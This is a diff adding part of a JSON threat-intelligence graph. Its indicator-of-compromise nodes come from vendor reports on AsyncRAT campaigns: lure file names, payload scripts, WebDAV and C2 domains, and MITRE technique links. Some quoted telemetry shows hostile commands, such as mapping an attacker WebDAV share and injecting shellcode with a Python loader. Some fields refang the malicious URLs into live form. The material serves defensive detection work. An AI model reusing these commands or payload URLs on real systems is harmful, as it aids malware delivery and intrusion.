+            ],
+            [
+              41,
+              "This script takes on two parameters that have default values and two required parameters — in this instance, the input (-i) new.bin and the key file (-k) a.txt."
+            ],
+            [
+              44,
+              "- The binary file new.bin serves as the primary input to ne.py, containing the main binary payload that is decrypted and injected into the target process (default: explorer.exe) via APC injection."
+            ],
+            [
+              45,
+              "When unpacked, these new.bin files were identified to be shellcode files created using Donut, an open-source framework used to generate position-independent shellcode."
+            ],
+            [
+              46,
+              "- Folders ab, ow, and vb contain different sets of new.bin, a.txt, and ne.py files, consisting of different sets of backdoor payloads alongside AsyncRAT."
+            ]
+          ]
+        },
+        "raw_value": "new.bin",
+        "canonical_value": "new.bin",
+        "normalized_value": "new.bin"
+      },
+      {
+        "node_id": "IOC_c7e40e739a3b",
+        "node_class": "ioc",
+        "node_type": "FilePath",
+        "node_text": "as.wsh",
+        "edges": [
+          "EDGE_3a2f84373dd1",
+          "EDGE_6b9e41313542"
+        ],
+        "source": {
+          "as.wsh_www.trendmicro.com_en_us_research_26_a_analyzing-a-a-multi-stage-asyncrat-campaign-via-mdr.html": [
+            [
+              18,
+              "These URLs point to a Windows Script Host file (as.wsh) located in the DavWWWRoot directory."
+            ],
+            [
+              25,
+              "In most of the cases that we investigated, the first file that was downloaded and executed was as.wsh which, in turn, downloads and executes anc.wsf."
+            ]
+          ]
+        },
+        "raw_value": "as.wsh",
+        "canonical_value": "as.wsh",
+        "normalized_value": "as.wsh"
+      },
+      {
+        "node_id": "IOC_cd18b75537f5",
+        "node_class": "ioc",
+        "node_type": "FilePath",
+        "node_text": "olsm.bat",
+        "edges": [
+          "EDGE_3575e0f1a1a2"
+        ],
+        "source": {
+          "olsm.bat_www.trendmicro.com_en_us_research_26_a_analyzing-a-a-multi-stage-asyncrat-campaign-via-mdr.html": [
+            [
+              4,
+              "- The malware ensures persistence through multiple vectors including startup folder scripts (ahke.bat, olsm.bat), WebDAV mounting, and legitimate \"living-off-the-land\" techniques using Windows Script Host, PowerShell, and built-in system utilities to evade detection."
+            ],
+            [
+              31,
+              "It then establishes persistence by dropping a batch file in the Startup folder; however, this time it downloads the files ahke.bat and olsm.bat."
+            ]
+          ]
+        },
+        "raw_value": "olsm.bat",
+        "canonical_value": "olsm.bat",
+        "normalized_value": "olsm.bat"
+      },
+      {
+        "node_id": "IOC_cf8cdf485a85",
+        "node_class": "ioc",
+        "node_type": "FilePath",
+        "node_text": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+        "edges": [
+          "EDGE_04ef99d90e9a",
+          "EDGE_c0ffb155a3e0"
+        ],
+        "source": {
+          "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe_www.trendmicro.com_en_us_research_26_a_analyzing-a-a-multi-stage-asyncrat-campaign-via-mdr.html": [
+            [
+              27,
+              "processFilePath: C:\\Windows\\System32\\cmd.exe\nprocessCmd: C:\\WINDOWS\\system32\\cmd.exe /c \"\"C:\\Users\\<USERNAME>\\AppData\\Local\\Temp\\vio.bat\" h \"\neventSubId: 2 - TELEMETRY_PROCESS_CREATE\nobjectFilePath: C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\nobjectCmd: powershell -Command \"iwr 'https://www.python.org/ftp/python/3.14.0/python-3.14.0-embed-amd64.zip' -OutFile 'C:\\Users\\<USERNAME>\\AppData\\Local\\Temp\\p.zip'\"\nThe other downloaded batch file (xeno.bat) has near-identical functions to vio.bat."
+            ]
+          ]
+        },
+        "raw_value": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+        "canonical_value": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+        "normalized_value": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"
+      },
+      {
+        "node_id": "IOC_d25ab9a6b70b",
+        "node_class": "ioc",
+        "node_type": "FilePath",
+        "node_text": "DavWWWRoot",
+        "edges": [],
+        "source": {
+          "DavWWWRoot_www.trendmicro.com_en_us_research_26_a_analyzing-a-a-multi-stage-asyncrat-campaign-via-mdr.html": [
+            [
+              18,
+              "These URLs point to a Windows Script Host file (as.wsh) located in the DavWWWRoot directory."
+            ]
+          ]
+        },
+        "raw_value": "DavWWWRoot",
+        "canonical_value": "DavWWWRoot",
+        "normalized_value": "DavWWWRoot"
+      },
+      {
+        "node_id": "IOC_d7424b1e1436",
+        "node_class": "ioc",
+        "node_type": "Domain",
+        "node_text": "trycloudflare[.]com",
+        "edges": [
+          "EDGE_413a10566f8a",
+          "EDGE_8ec1448c1e16",
+          "EDGE_bdfed18f9ed1"
+        ],
+        "source": {
+          "trycloudflare[.]com_www.trendmicro.com_en_us_research_26_a_analyzing-a-a-multi-stage-asyncrat-campaign-via-mdr.html": [
+            [
+              17,
+              "The downloaded ZIP file contains the Rechnung-zu-Auftrag-W19248960825.pdf.url Internet Shortcut file, which links to a WebDAV resource hosted on various servers within Cloudflare's free-tier service with URLs containing trycloudflare[.]com in their names."
+            ],
+            [
+              19,
+              "The specific URLs used in these shortcut files may vary, but they all employ the trycloudflare[.]com domain to obfuscate their true intent."
+            ],
+            [
+              21,
+              "Meanwhile, rundll32.exe executes the DavSetCookie function from davclnt.dll with parameters specifying a WebDAV server (plus-condos-thy-redeem.trycloudflare[.]com) and an SSL connection."
+            ],
+            [
+              36,
+              "objectCmd: net use Q: \"\\\\syracuse-seeks-wilson-row.trycloudflare[.]com@SSL\\of\" /persistent:no\nThe Python library was then extracted from the mounted Q drive to C:\\Users\\<USERNAME>\\AppData\\Local\\Microsoft\\SystemCache25."
+            ]
+          ]
+        },
+        "raw_value": "trycloudflare[.]com",
+        "canonical_value": "trycloudflare.com",
+        "normalized_value": "trycloudflare.com"
+      },
+      {
+        "node_id": "IOC_dffe5915dd92",
+        "node_class": "ioc",
+        "node_type": "FilePath",
+        "node_text": "ahke.bat",
+        "edges": [
+          "EDGE_ece64d5bd66a"
+        ],
+        "source": {
+          "ahke.bat_www.trendmicro.com_en_us_research_26_a_analyzing-a-a-multi-stage-asyncrat-campaign-via-mdr.html": [
+            [
+              4,
+              "- The malware ensures persistence through multiple vectors including startup folder scripts (ahke.bat, olsm.bat), WebDAV mounting, and legitimate \"living-off-the-land\" techniques using Windows Script Host, PowerShell, and built-in system utilities to evade detection."
+            ],
+            [
+              31,
+              "It then establishes persistence by dropping a batch file in the Startup folder; however, this time it downloads the files ahke.bat and olsm.bat."
+            ]
+          ]
+        },
+        "raw_value": "ahke.bat",
+        "canonical_value": "ahke.bat",
+        "normalized_value": "ahke.bat"
+      },
+      {
+        "node_id": "IOC_e2c1dc2bbfa0",
+        "node_class": "ioc",
+        "node_type": "FilePath",
+        "node_text": "a.txt",
+        "edges": [
+          "EDGE_6188e7c53930",
+          "EDGE_ccb69d26b808"
+        ],
+        "source": {
+          "a.txt_www.trendmicro.com_en_us_research_26_a_analyzing-a-a-multi-stage-asyncrat-campaign-via-mdr.html": [
+            [
+              32,
+              "We observed python.exe being used to perform code injection into explorer.exe via the command python ne.py new.bin -k a.txt."
+            ],
+            [
+              41,
+              "This script takes on two parameters that have default values and two required parameters — in this instance, the input (-i) new.bin and the key file (-k) a.txt."
+            ],
+            [
+              43,
+              "The a.txt file contains keys used by ne.py to decrypt the obfuscated input binary file new.bin."
+            ],
+            [
+              46,
+              "- Folders ab, ow, and vb contain different sets of new.bin, a.txt, and ne.py files, consisting of different sets of backdoor payloads alongside AsyncRAT."
+            ]
+          ]
+        },
+        "raw_value": "a.txt",
+        "canonical_value": "a.txt",
+        "normalized_value": "a.txt"
+      },
+      {
+        "node_id": "IOC_eceea5a00ad1",
+        "node_class": "ioc",
+        "node_type": "FilePath",
+        "node_text": "Rechnung zu Auftrag W19248960825.pdf.zip",
+        "edges": [
+          "EDGE_ba0ac9566e93"
+        ],
+        "source": {
+          "Rechnung zu Auftrag W19248960825.pdf.zip_www.trendmicro.com_en_us_research_26_a_analyzing-a-a-multi-stage-asyncrat-campaign-via-mdr.html": [
+            [
+              15,
+              "The image below shows the presence of Outlook.exe, suggesting that the attack involved directing the user to download a malicious archive file named Rechnung zu Auftrag W19248960825.pdf.zip (translating to “Invoice for Order” in German)."
+            ]
+          ]
+        },
+        "raw_value": "Rechnung zu Auftrag W19248960825.pdf.zip",
+        "canonical_value": "Rechnung zu Auftrag W19248960825.pdf.zip",
+        "normalized_value": "Rechnung zu Auftrag W19248960825.pdf.zip"
+      },
+      {
+        "node_id": "IOC_15ad1397b417",
+        "node_class": "ioc",
+        "node_type": "FilePath",
+        "node_text": "admin.ps1",
+        "edges": [
+          "EDGE_c4f13684bfcc",
+          "EDGE_cbddbdae522a"
+        ],
+        "source": {
+          "admin.ps1_www.zscaler.com_blogs_security-research_targeted-attack-thailand-pass-customers-delivers-asyncrat": [
+            [
+              17,
+              "The image depicts the content of the supporting files like admin.vbs, admin.ps1, 1_powerrun.vbs, 1.bat and 1.ps1 whose main task is to stop the particular AV service to evade detection and to execute the malware attack."
+            ]
+          ]
+        },
+        "raw_value": "admin.ps1",
+        "canonical_value": "admin.ps1",
+        "normalized_value": "admin.ps1"
+      },
+      {
+        "node_id": "IOC_2d1080618859",
+        "node_class": "ioc",
+        "node_type": "FilePath",
+        "node_text": "1_powerrun.vbs",
+        "edges": [
+          "EDGE_0105c58b4da7",
+          "EDGE_1970343aa1d5"
+        ],
+        "source": {
+          "1_powerrun.vbs_www.zscaler.com_blogs_security-research_targeted-attack-thailand-pass-customers-delivers-asyncrat": [
+            [
+              17,
+              "The image depicts the content of the supporting files like admin.vbs, admin.ps1, 1_powerrun.vbs, 1.bat and 1.ps1 whose main task is to stop the particular AV service to evade detection and to execute the malware attack."
+            ]
+          ]
+        },
+        "raw_value": "1_powerrun.vbs",
+        "canonical_value": "1_powerrun.vbs",
+        "normalized_value": "1_powerrun.vbs"
+      },
+      {
+        "node_id": "IOC_352516063d96",
+        "node_class": "ioc",
+        "node_type": "URL",
+        "node_text": "cdn[.]discordapp[.]com/attachments/921529408060289114/947221997325258772/qr_thailand_pass.zip",
+        "edges": [
+          "EDGE_6a4b32dc8cc2"
+        ],
+        "source": {
+          "cdn[.]discordapp[.]com/attachments/921529408060289114/947221997325258772/qr_thailand_pass.zip_www.zscaler.com_blogs_security-research_targeted-attack-thailand-pass-customers-delivers-asyncrat": [
+            [
+              39,
+              "Similar campaign - Delivery using Discord CDN:\ncdn[.]discordapp[.]com/attachments/921529408060289114/947221997325258772/qr_thailand_pass.zip."
+            ]
+          ]
+        },
+        "raw_value": "cdn[.]discordapp[.]com/attachments/921529408060289114/947221997325258772/qr_thailand_pass.zip",
+        "canonical_value": "http://cdn.discordapp.com/attachments/921529408060289114/947221997325258772/qr_thailand_pass.zip",
+        "normalized_value": "http://cdn.discordapp.com/attachments/921529408060289114/947221997325258772/qr_thailand_pass.zip"
+      },
+      {
+        "node_id": "IOC_3d20f66ab349",
+        "node_class": "ioc",
+        "node_type": "FilePath",
+        "node_text": "1.ps1",
+        "edges": [
+          "EDGE_4c2c94b888c6",
+          "EDGE_5297c8e43949"
+        ],
+        "source": {
+          "1.ps1_www.zscaler.com_blogs_security-research_targeted-attack-thailand-pass-customers-delivers-asyncrat": [
+            [
+              17,
+              "The image depicts the content of the supporting files like admin.vbs, admin.ps1, 1_powerrun.vbs, 1.bat and 1.ps1 whose main task is to stop the particular AV service to evade detection and to execute the malware attack."
+            ],
+            [
+              18,
+              "The final goal of the “1.ps1” powershell script is to stop the MalwareBytes service and add exclusion for the supporting files during the real time scanning as depicted below."
+            ]
+          ]
+        },
+        "raw_value": "1.ps1",
+        "canonical_value": "1.ps1",
+        "normalized_value": "1.ps1"
+      },
+      {
+        "node_id": "IOC_41dfdc5c68b1",
+        "node_class": "ioc",
+        "node_type": "FilePath",
+        "node_text": "1.bat",
+        "edges": [
+          "EDGE_e4c842e14f69",
+          "EDGE_ec42f57d191e"
+        ],
+        "source": {
+          "1.bat_www.zscaler.com_blogs_security-research_targeted-attack-thailand-pass-customers-delivers-asyncrat": [
+            [
+              17,
+              "The image depicts the content of the supporting files like admin.vbs, admin.ps1, 1_powerrun.vbs, 1.bat and 1.ps1 whose main task is to stop the particular AV service to evade detection and to execute the malware attack."
+            ]
+          ]
+        },
+        "raw_value": "1.bat",
+        "canonical_value": "1.bat",
+        "normalized_value": "1.bat"
+      },
+      {
+        "node_id": "IOC_464794d7ed57",
+        "node_class": "ioc",
+        "node_type": "FilePath",
+        "node_text": "Testavast+denf.txt",
+        "edges": [
+          "EDGE_91131338c030",
+          "EDGE_aefa2a1585b2"
+        ],
+        "source": {
+          "Testavast+denf.txt_www.zscaler.com_blogs_security-research_targeted-attack-thailand-pass-customers-delivers-asyncrat": [
+            [
+              10,
+              "After de-obfuscating the VBScript, we can see that the script tries to download a Testavast+denf.txt file from the web hosting site(ec2-34-229-64-131[.]compute-1[.]amazonaws[.]com) and executes the code using the “IEX” operation with the help of “powershell”."
+            ],
+            [
+              11,
+              "The following image shows the content of the Testavast+denf.txt file which contains a code to check if antivirus services ESET, Avast, AVG, or Malwarebytes are running."
+            ]
+          ]
+        },
+        "raw_value": "Testavast+denf.txt",
+        "canonical_value": "Testavast+denf.txt",
+        "normalized_value": "Testavast+denf.txt"
+      },
+      {
+        "node_id": "IOC_4ea48062c5d3",
+        "node_class": "ioc",
+        "node_type": "FilePath",
+        "node_text": "SecurityHealth[.].exe",
+        "edges": [
+          "EDGE_bc0605d852eb"
+        ],
+        "source": {
+          "SecurityHealth[.].exe_www.zscaler.com_blogs_security-research_targeted-attack-thailand-pass-customers-delivers-asyncrat": [
+            [
+              23,
+              "It also copies the following “SecurityHealth[.].exe” and “SecurityHealth[.]exe[.]manifest” files in the startup folder for persistence techniques."
+            ]
+          ],
+          "SecurityHealth.exe_www.zscaler.com_blogs_security-research_targeted-attack-thailand-pass-customers-delivers-asyncrat": [
+            [
+              21,
+              "Here the script downloads “task.txt”, “SecurityHealth.exe” and “SecurityHealth.exe.manifest” files from the following domain “hxxp://microsoft[.]soundcast[.]me”."
+            ],
+            [
+              24,
+              "The following image shows the content of the Task.txt file which creates a scheduled task as GoogleUpdate to execute the dropped SecurityHealth[.]exe file."
+            ]
+          ]
+        },
+        "raw_value": "SecurityHealth[.].exe",
+        "canonical_value": "SecurityHealth.exe",
+        "normalized_value": "SecurityHealth.exe",
+        "alias": [
+          "SecurityHealth.exe"
+        ]
+      },
+      {
+        "node_id": "IOC_4edb0b7ee0af",
+        "node_class": "ioc",
+        "node_type": "Domain",
+        "node_text": "invoice-update[.]myiphost[.]com",
+        "edges": [
+          "EDGE_3f75d833e3f9"
+        ],
+        "source": {
+          "invoice-update[.]myiphost[.]com_www.zscaler.com_blogs_security-research_targeted-attack-thailand-pass-customers-delivers-asyncrat": [
+            [
+              38,
+              "Finally, it steals the networking credentials of the victim and sends the stolen information to the following C&C server (invoice-update[.]myiphost[.]com) as shown below."
+            ]
+          ]
+        },
+        "raw_value": "invoice-update[.]myiphost[.]com",
+        "canonical_value": "invoice-update.myiphost.com",
+        "normalized_value": "invoice-update.myiphost.com"
+      },
+      {
+        "node_id": "IOC_62b9d47e14a0",
+        "node_class": "ioc",
+        "node_type": "URL",
+        "node_text": "hxxps://bit[.]ly/Thailand-passport",
+        "edges": [
+          "EDGE_94120b598628"
+        ],
+        "source": {
+          "hxxps://bit[.]ly/Thailand-passport_www.zscaler.com_blogs_security-research_targeted-attack-thailand-pass-customers-delivers-asyncrat": [
+            [
+              6,
+              "hxxps://bit[.]ly/Thailand-passport - is an shortened URL of\nhxxps://onedrive.live[.]com/Download?cid=6BCBE135551869F2&resid=6BCBE135551869F2!168&authkey=AGoYtbf1Lb5VjFg\nOn accessing the above URL, the page delivers a HTML file named “Thailand Pass Registration System (for air travel.html”."
+            ]
+          ]
+        },
+        "raw_value": "hxxps://bit[.]ly/Thailand-passport",
+        "canonical_value": "https://bit.ly/Thailand-passport",
+        "normalized_value": "https://bit.ly/Thailand-passport"
+      },
+      {
+        "node_id": "IOC_65707b8902d5",
+        "node_class": "ioc",
+        "node_type": "URL",
+        "node_text": "hxxps://onedrive.live[.]com/Download?cid=6BCBE135551869F2&resid=6BCBE135551869F2!168&authkey=AGoYtbf1Lb5VjFg",
+        "edges": [
+          "EDGE_d3cd7a3fff92"
+        ],
+        "source": {
+          "hxxps://onedrive.live[.]com/Download?cid=6BCBE135551869F2&resid=6BCBE135551869F2!168&authkey=AGoYtbf1Lb5VjFg_www.zscaler.com_blogs_security-research_targeted-attack-thailand-pass-customers-delivers-asyncrat": [
+            [
+              6,
+              "hxxps://bit[.]ly/Thailand-passport - is an shortened URL of\nhxxps://onedrive.live[.]com/Download?cid=6BCBE135551869F2&resid=6BCBE135551869F2!168&authkey=AGoYtbf1Lb5VjFg\nOn accessing the above URL, the page delivers a HTML file named “Thailand Pass Registration System (for air travel.html”."
+            ]
+          ]
+        },
+        "raw_value": "hxxps://onedrive.live[.]com/Download?cid=6BCBE135551869F2&resid=6BCBE135551869F2!168&authkey=AGoYtbf1Lb5VjFg",
+        "canonical_value": "https://onedrive.live.com/Download?cid=6BCBE135551869F2&resid=6BCBE135551869F2!168&authkey=AGoYtbf1Lb5VjFg",
+        "normalized_value": "https://onedrive.live.com/Download?cid=6BCBE135551869F2&resid=6BCBE135551869F2!168&authkey=AGoYtbf1Lb5VjFg"
+      },
+      {
+        "node_id": "IOC_6d46913a25f2",
+        "node_class": "ioc",
+        "node_type": "URL",
+        "node_text": "hxxp://microsoft[.]soundcast[.]me",
+        "edges": [
+          "EDGE_e224dd9c03d9"
+        ],
+        "source": {
+          "hxxp://microsoft[.]soundcast[.]me_www.zscaler.com_blogs_security-research_targeted-attack-thailand-pass-customers-delivers-asyncrat": [
+            [
+              21,
+              "Here the script downloads “task.txt”, “SecurityHealth.exe” and “SecurityHealth.exe.manifest” files from the following domain “hxxp://microsoft[.]soundcast[.]me”."
+            ]
+          ]
+        },
+        "raw_value": "hxxp://microsoft[.]soundcast[.]me",
+        "canonical_value": "http://microsoft.soundcast.me",
+        "normalized_value": "http://microsoft.soundcast.me"
+      },
+      {
+        "node_id": "IOC_813450f89434",
+        "node_class": "ioc",
+        "node_type": "FilePath",
+        "node_text": "Thailand Pass Registration System (for air travel.html",
+        "edges": [
+          "EDGE_8beccf0ea34c"
+        ],
+        "source": {
+          "Thailand Pass Registration System (for air travel.html_www.zscaler.com_blogs_security-research_targeted-attack-thailand-pass-customers-delivers-asyncrat": [
+            [
+              6,
+              "hxxps://bit[.]ly/Thailand-passport - is an shortened URL of\nhxxps://onedrive.live[.]com/Download?cid=6BCBE135551869F2&resid=6BCBE135551869F2!168&authkey=AGoYtbf1Lb5VjFg\nOn accessing the above URL, the page delivers a HTML file named “Thailand Pass Registration System (for air travel.html”."
+            ]
+          ]
+        },
+        "raw_value": "Thailand Pass Registration System (for air travel.html",
+        "canonical_value": "Thailand Pass Registration System (for air travel.html",
+        "normalized_value": "Thailand Pass Registration System (for air travel.html"
+      },
+      {
+        "node_id": "IOC_822b40d45382",
+        "node_class": "ioc",
+        "node_type": "FilePath",
+        "node_text": "admin.vbs",
+        "edges": [
+          "EDGE_34369c0b9516",
+          "EDGE_3e4a0e948199"
+        ],
+        "source": {
+          "admin.vbs_www.zscaler.com_blogs_security-research_targeted-attack-thailand-pass-customers-delivers-asyncrat": [
+            [
+              17,
+              "The image depicts the content of the supporting files like admin.vbs, admin.ps1, 1_powerrun.vbs, 1.bat and 1.ps1 whose main task is to stop the particular AV service to evade detection and to execute the malware attack."
+            ]
+          ]
+        },
+        "raw_value": "admin.vbs",
+        "canonical_value": "admin.vbs",
+        "normalized_value": "admin.vbs"
+      },
+      {
+        "node_id": "IOC_904d45b8a9d2",
+        "node_class": "ioc",
+        "node_type": "FilePath",
+        "node_text": "aspnet_compiler.exe",
+        "edges": [
+          "EDGE_bc72188e89a6"
+        ],
+        "source": {
+          "aspnet_compiler.exe_www.zscaler.com_blogs_security-research_targeted-attack-thailand-pass-customers-delivers-asyncrat": [
+            [
+              29,
+              "The variable $Filc contains the actual AsyncRAT malware payload, which is injected into a legitimate aspnet_compiler.exe file to show it as a genuine file running in background."
+            ],
+            [
+              33,
+              "The injected malware payload runs as a legitimate aspnet_compiler.exe process as shown below."
+            ],
+            [
+              36,
+              "The following APIs are also used to inject the malware AsyncRAT into the legitimate file aspnet_compiler.exe file."
+            ]
+          ]
+        },
+        "raw_value": "aspnet_compiler.exe",
+        "canonical_value": "aspnet_compiler.exe",
+        "normalized_value": "aspnet_compiler.exe"
+      },
+      {
+        "node_id": "IOC_9d64521e00e2",
+        "node_class": "ioc",
+        "node_type": "FilePath",
+        "node_text": "killd.txt",
+        "edges": [
+          "EDGE_9003a87fdc48",
+          "EDGE_cb5ba7a3f9fe"
+        ],
+        "source": {
+          "killd.txt_www.zscaler.com_blogs_security-research_targeted-attack-thailand-pass-customers-delivers-asyncrat": [
+            [
+              16,
+              "The following image shows the content of the killd.txt file which downloads the supporting files from web hosting site(ec2-34-229-64-131[.]compute-1[.]amazonaws[.]com)."
+            ],
+            [
+              19,
+              "After disabling the running antivirus service, it downloads the AsyncRAT malware from the killd.txt file and starts its malicious activity on the victim's machine."
+            ],
+            [
+              28,
+              "The downloaded powershell script aaa.ps1 contains the same AyncRAT payload which is present in the killd.txt file(Malwarebytes AV related file)."
+            ]
+          ]
+        },
+        "raw_value": "killd.txt",
+        "canonical_value": "killd.txt",
+        "normalized_value": "killd.txt"
+      },
+      {
+        "node_id": "IOC_a09549415952",
+        "node_class": "ioc",
+        "node_type": "FilePath",
+        "node_text": "untitled.ps1",
+        "edges": [
+          "EDGE_0f3483ccd76d",
+          "EDGE_efdf97ac55ca"
+        ],
+        "source": {
+          "untitled.ps1_www.zscaler.com_blogs_security-research_targeted-attack-thailand-pass-customers-delivers-asyncrat": [
+            [
+              13,
+              "It saves the files related to the antivirus service as untitled.ps1 and executes that powershell script."
+            ],
+            [
+              22,
+              "Then, it executes the “task.txt” file as “untitled.ps1”."
+            ]
+          ]
+        },
+        "raw_value": "untitled.ps1",
+        "canonical_value": "untitled.ps1",
+        "normalized_value": "untitled.ps1"
+      },
+      {
+        "node_id": "IOC_a0ce1b230a39",
+        "node_class": "ioc",
+        "node_type": "FilePath",
+        "node_text": "qr_thailand_pass.vbs",
+        "edges": [
+          "EDGE_6f40216b6f8e"
+        ],
+        "source": {
+          "qr_thailand_pass.vbs_www.zscaler.com_blogs_security-research_targeted-attack-thailand-pass-customers-delivers-asyncrat": [
+            [
+              8,
+              "This ISO file contains a VBScript called “qr_thailand_pass.vbs” file which begins the malware activity."
+            ]
+          ]
+        },
+        "raw_value": "qr_thailand_pass.vbs",
+        "canonical_value": "qr_thailand_pass.vbs",
+        "normalized_value": "qr_thailand_pass.vbs"
+      },
+      {
+        "node_id": "IOC_ac0bd4b7d08c",
+        "node_class": "ioc",
+        "node_type": "FilePath",
+        "node_text": "aaa.ps1",
+        "edges": [
+          "EDGE_2f0ff980242c",
+          "EDGE_edd799a4ae7b"
+        ],
+        "source": {
+          "aaa.ps1_www.zscaler.com_blogs_security-research_targeted-attack-thailand-pass-customers-delivers-asyncrat": [
+            [
+              27,
+              "The following image shows the decoded content present in the SecurityHealth[.]exe[.]manifest containing the URL(34[.]71[.]81[.]158/Run/aaa.ps1) to download the malicious powershell script(aaa.ps1)."
+            ],
+            [
+              28,
+              "The downloaded powershell script aaa.ps1 contains the same AyncRAT payload which is present in the killd.txt file(Malwarebytes AV related file)."
+            ]
+          ]
+        },
+        "raw_value": "aaa.ps1",
+        "canonical_value": "aaa.ps1",
+        "normalized_value": "aaa.ps1"
+      },
+      {
+        "node_id": "IOC_b812d40d06ae",
+        "node_class": "ioc",
+        "node_type": "FilePath",
+        "node_text": "SecurityHealth.exe.manifest",
+        "edges": [
+          "EDGE_01328e6cc50b"
+        ],
+        "source": {
+          "SecurityHealth.exe.manifest_www.zscaler.com_blogs_security-research_targeted-attack-thailand-pass-customers-delivers-asyncrat": [
+            [
+              21,
+              "Here the script downloads “task.txt”, “SecurityHealth.exe” and “SecurityHealth.exe.manifest” files from the following domain “hxxp://microsoft[.]soundcast[.]me”."
+            ]
+          ],
+          "SecurityHealth[.]exe[.]manifest_www.zscaler.com_blogs_security-research_targeted-attack-thailand-pass-customers-delivers-asyncrat": [
+            [
+              23,
+              "It also copies the following “SecurityHealth[.].exe” and “SecurityHealth[.]exe[.]manifest” files in the startup folder for persistence techniques."
+            ],
+            [
+              26,
+              "The securityHealth[.]exe file needs the SecurityHealth[.]exe[.]manifest supporting file to execute its malicious activities."
+            ]
+          ]
+        },
+        "raw_value": "SecurityHealth.exe.manifest",
+        "canonical_value": "SecurityHealth.exe.manifest",
+        "normalized_value": "SecurityHealth.exe.manifest",
+        "alias": [
+          "SecurityHealth[.]exe[.]manifest"
+        ]
+      },
+      {
+        "node_id": "IOC_bf1668b07ccb",
+        "node_class": "ioc",
+        "node_type": "Domain",
+        "node_text": "tp.consular[.]go[.]th",
+        "edges": [],
+        "source": {
+          "tp.consular[.]go[.]th_www.zscaler.com_blogs_security-research_targeted-attack-thailand-pass-customers-delivers-asyncrat": [
+            [
+              4,
+              "The Thailand Pass organization has issued an advisory for these malicious campaigns on their official website \"tp.consular[.]go[.]th\" as shown below."
+            ]
+          ]
+        },
+        "raw_value": "tp.consular[.]go[.]th",
+        "canonical_value": "tp.consular.go.th",
+        "normalized_value": "tp.consular.go.th"
+      },
+      {
+        "node_id": "IOC_c424e4e465f3",
+        "node_class": "ioc",
+        "node_type": "URL",
+        "node_text": "34[.]71[.]81[.]158/Run/aaa.ps1",
+        "edges": [
+          "EDGE_ddf01b7b3a59"
+        ],
+        "source": {
+          "34[.]71[.]81[.]158/Run/aaa.ps1_www.zscaler.com_blogs_security-research_targeted-attack-thailand-pass-customers-delivers-asyncrat": [
+            [
+              27,
+              "The following image shows the decoded content present in the SecurityHealth[.]exe[.]manifest containing the URL(34[.]71[.]81[.]158/Run/aaa.ps1) to download the malicious powershell script(aaa.ps1)."
+            ]
+          ]
+        },
+        "raw_value": "34[.]71[.]81[.]158/Run/aaa.ps1",
+        "canonical_value": "http://34.71.81.158/Run/aaa.ps1",
+        "normalized_value": "http://34.71.81.158/Run/aaa.ps1"
+      },
+      {
+        "node_id": "IOC_ec7f69171716",
+        "node_class": "ioc",
+        "node_type": "FilePath",
+        "node_text": "task.txt",
+        "edges": [
+          "EDGE_12ca7069a8af",
+          "EDGE_1d6053e2c9b1",
+          "EDGE_a8b7c65c770b"
+        ],
+        "source": {
+          "task.txt_www.zscaler.com_blogs_security-research_targeted-attack-thailand-pass-customers-delivers-asyncrat": [
+            [
+              21,
+              "Here the script downloads “task.txt”, “SecurityHealth.exe” and “SecurityHealth.exe.manifest” files from the following domain “hxxp://microsoft[.]soundcast[.]me”."
+            ],
+            [
+              22,
+              "Then, it executes the “task.txt” file as “untitled.ps1”."
+            ],
+            [
+              24,
+              "The following image shows the content of the Task.txt file which creates a scheduled task as GoogleUpdate to execute the dropped SecurityHealth[.]exe file."
+            ]
+          ]
+        },
+        "raw_value": "task.txt",
+        "canonical_value": "task.txt",
+        "normalized_value": "task.txt"
+      },
+      {
+        "node_id": "IOC_fc3fe666d823",
+        "node_class": "ioc",
+        "node_type": "FilePath",
+        "node_text": "thailand_Passport.iso",
+        "edges": [],
+        "source": {
+          "thailand_Passport.iso_www.zscaler.com_blogs_security-research_targeted-attack-thailand-pass-customers-delivers-asyncrat": [
+            [
+              7,
+              "Once the user opens the HTML file, it automatically drops an ISO file named “thailand_Passport.iso” without any user interaction, as shown below."
+            ]
+          ]
+        },
+        "raw_value": "thailand_Passport.iso",
+        "canonical_value": "thailand_Passport.iso",
+        "normalized_value": "thailand_Passport.iso"
+      },
+      {
+        "node_id": "IOC_ff215c58bd14",
+        "node_class": "ioc",
+        "node_type": "Domain",
+        "node_text": "ec2-34-229-64-131[.]compute-1[.]amazonaws[.]com",
+        "edges": [
+          "EDGE_11f3d1f34667",
+          "EDGE_c68d8c983667"
+        ],
+        "source": {
+          "ec2-34-229-64-131[.]compute-1[.]amazonaws[.]com_www.zscaler.com_blogs_security-research_targeted-attack-thailand-pass-customers-delivers-asyncrat": [
+            [
+              10,
+              "After de-obfuscating the VBScript, we can see that the script tries to download a Testavast+denf.txt file from the web hosting site(ec2-34-229-64-131[.]compute-1[.]amazonaws[.]com) and executes the code using the “IEX” operation with the help of “powershell”."
+            ],
+            [
+              16,
+              "The following image shows the content of the killd.txt file which downloads the supporting files from web hosting site(ec2-34-229-64-131[.]compute-1[.]amazonaws[.]com)."
+            ]
+          ]
+        },
+        "raw_value": "ec2-34-229-64-131[.]compute-1[.]amazonaws[.]com",
+        "canonical_value": "ec2-34-229-64-131.compute-1.amazonaws.com",
+        "normalized_value": "ec2-34-229-64-131.compute-1.amazonaws.com"
+      }
+    ]
+  },
+  "edges": [
+    {
+      "edge_id": "EDGE_3527e1f69df2",
+      "node_u": "IOC_797cd5703273",
+      "node_v": "TTP_T1219",
+      "edge_type": "ioc-ttp"
+    },
+    {
+      "edge_id": "EDGE_37922bfe33e8",
+      "node_u": "HL_0e005d2a24a7",
+      "node_v": "TTP_T1055",
+      "edge_type": "high_level-ttp"
+    },
+    {
+      "edge_id": "EDGE_56128b297bdc",
+      "node_u": "IOC_b57517de96ac",
+      "node_v": "TTP_T1204",
+      "edge_type": "ioc-ttp"
+    },
+    {
+      "edge_id": "EDGE_562234411600",
+      "node_u": "HL_a4578f2623b0",
+      "node_v": "TTP_T1055",
+      "edge_type": "high_level-ttp"
+    },
+    {
+      "edge_id": "EDGE_590f2ce7205b",
+      "node_u": "HL_0607bb9bb168",
+      "node_v": "TTP_T1566",
+      "edge_type": "high_level-ttp"
+    },
+    {
